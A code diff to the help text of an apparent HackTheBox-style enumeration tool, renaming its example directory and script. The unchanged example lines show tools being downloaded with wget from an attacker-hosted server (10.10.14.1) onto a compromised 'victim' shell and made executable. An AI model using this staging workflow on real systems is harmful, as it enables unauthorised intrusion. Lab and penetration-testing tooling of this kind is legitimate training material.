@@ -50,8 +50,8 @@ def help():
            the update parameter in order to download all the necessary tools to the current 
            directory. Then start the builtin web server to host the tools and receive the reports.\n 
    Example:
-           Host machine: root@kali:~/htbenum# ./roommate.sh -u
-           Host machine: root@kali:~/htbenum# ./roommate.sh -i 10.10.14.1 -p 80 -w
+           Host machine: root@kali:~/nosey_neighbor# ./roommate.py -u
+           Host machine: root@kali:~/nosey_neighbor# ./roommate.py -i 10.10.14.1 -p 80 -w
            
            Linux Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/roommate.sh
            Linux Victim machine: www-data@victim:/tmp$ chmod +x ./roommate.sh
